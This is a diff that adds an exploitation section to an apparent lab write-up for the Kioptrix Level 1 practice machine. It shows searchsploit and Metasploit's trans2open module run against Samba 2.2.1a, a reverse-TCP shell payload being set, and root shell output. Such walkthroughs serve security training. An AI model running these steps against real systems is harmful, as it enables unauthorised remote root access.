@@ -361,6 +361,70 @@ sudo ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-ds
 
 Now we can connect to ssh but we dont know the password so it's of no use.
 
+## Research for possbile exploit
+
+After searching exploit-db and Rapid7
+
+- Found an exploit for **Samba 2.2.1a** [trans2open]
+- You can also find this using **searchsploit**
+
+```
+$ searchsploit samba 2.2 
+```
+
+## Exploiting
+
+- Run Metasploit
+```
+msf5 > search trans2open
+```
+
+And we will find exploit module
+```
+exploit/linux/trans2open
+```
+Use it :
+```
+msf5 > use exploit/linux/trans2open
+```
+Set the options
+```
+msf5 exploit(linux/trans2open) > options
+msf5 exploit(linux/trans2open) > set rhosts 192.168.57.4
+```
+You can type 'show targets' for viewing for which target this will be performing
+```
+msf5 > exploit(linux/trans2open) show targets
+```
+Now if you directly exploit/run : It will try to run many shells like a bruteforce and possible may not work because connection keeps dying.
+
+Now if we again type **show options**
+```
+msf5 > exploit(linux/trans2open) > show options
+```
+Now you'll see more options that says like that the payload has some problems to configure the 'payload options'
+
+**so we're gonna setup a payload!**
+```
+msf5 exploit(linux/trans2open) > set payload linux/x86/shell_reverse_tcp
+msf5 exploit(linux/trans2open) > options
+msf5 exploit(linux/trans2open) > run/exploit
+```
+we'll get a shell if we succeed
+
+check if you got a shell
+```bash
+$ whoami  - Check the present user
+root
+$ hostname - check hostname
+kioptrix.level1
+```
+
+**Done You have got a shell!**
+
+I'll Add more ways to exploit this box ! there are 2 more ways you can get a shell  
+
+
 
 
 
